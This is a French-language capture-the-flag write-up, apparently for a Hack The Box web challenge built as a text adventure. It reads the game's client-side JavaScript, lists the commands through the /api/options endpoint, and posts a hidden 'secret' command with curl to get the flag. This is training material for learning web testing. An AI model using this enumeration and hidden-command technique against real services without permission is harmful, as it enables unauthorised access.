@@ -1,0 +1,82 @@
+- En examinant le code source de la page web, on découvre plusieurs éléments intéressants :
+- Structure du jeu : Un système de progression par étapes (steps 1 à 4)
+
+Points d'API :
+- GET /api/options - Retourne toutes les commandes disponibles
+- POST /api/monitor - Accepte les commandes du joueur
+- Logique côté client : Le code JavaScript gère la validation des commandes et la progression
+
+Analyse du code :
+- En examinant le fichier main.js, on identifie plusieurs points clés :
+
+1. Validation des commandes
+
+if (availableOptions[currentStep].includes(currentCommand) || availableOptions['secret'].includes(currentCommand))
+
+Cette condition montre qu'il existe deux types de commandes valides :
+- Les commandes normales pour l'étape courante
+- Les commandes secrètes (secret)
+
+2. Condition win :
+
+if(data.message.includes('HTB{')) {
+    playerWon();
+    fetchingResponse = false;
+    return;
+}
+
+Exploitation
+- Étape 1 : Récupération des commandes disponibles :
+
+curl http://94.237.51.160:43570/api/options
+
+Résultat :
+
+(venv) szzaps@vulnhub:~/dev$ curl http://94.237.51.160:43570/api/options
+{
+  "allPossibleCommands": {
+    "1": [
+      "HEAD NORTH",
+      "HEAD WEST",
+      "HEAD EAST",
+      "HEAD SOUTH"
+    ],
+    "2": [
+      "GO DEEPER INTO THE FOREST",
+      "FOLLOW A MYSTERIOUS PATH",
+      "CLIMB A TREE",
+      "TURN BACK"
+    ],
+    "3": [
+      "EXPLORE A CAVE",
+      "CROSS A RICKETY BRIDGE",
+      "FOLLOW A GLOWING BUTTERFLY",
+      "SET UP CAMP"
+    ],
+    "4": [
+      "ENTER A MAGICAL PORTAL",
+      "SWIM ACROSS A MYSTERIOUS LAKE",
+      "FOLLOW A SINGING SQUIRREL",
+      "BUILD A RAFT AND SAIL DOWNSTREAM"
+    ],
+    "secret": [
+      "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"
+    ]
+  }
+}
+
+Étape 2 : Utilisation de la commande secrète
+- L'analyse du code montre que la commande secrète peut être utilisée à n'importe quelle étape du jeu, sans nécessiter de progression préalable.
+
+curl -X POST http://94.237.51.160:43570/api/monitor \
+  -H "Content-Type: application/json" \
+  -d '{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
+
+Résultat : 
+
+(venv) szzaps@vulnhub:~/dev$ curl -X POST http://94.237.51.160:43570/api/monitor \
+  -H "Content-Type: application/json" \
+  -d '{"command": "Blip-blop, in a pickle with a hiccup! Shmiggity-shmack"}'
+{
+  "message": "HTB{...}"
+}
